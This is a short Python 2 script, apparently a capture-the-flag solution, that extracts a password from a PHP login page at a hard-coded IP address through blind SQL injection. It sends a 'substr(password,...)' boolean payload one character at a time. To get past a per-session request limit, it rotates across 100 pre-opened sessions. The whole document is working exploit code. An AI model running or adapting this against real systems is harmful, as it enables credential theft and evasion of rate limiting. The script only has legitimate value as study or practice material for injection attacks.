import requests, string, sys

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

print "starting sessions"
sessions = []
for i in range(100):
    session = requests.session()
    session.get('http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/index.php')
    sessions.append(session)
    sys.stdout.write(".")
    sys.stdout.flush()
print "\n"
print "starting bf"
base = "' or 1=1) and (substr(password,%d,1)='%s"

count = 0
current_session = 0
for j in range(30):
    for i in chunks(string.lowercase, 1):
        cur = base%(j+1, i)
        data = sessions[current_session].post(
            'http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/index.php',
            data={'password':cur}).text
        count += 1
        if count == 110:
            current_session += 1
            count = 0
        if data == "True":
            print i
            break

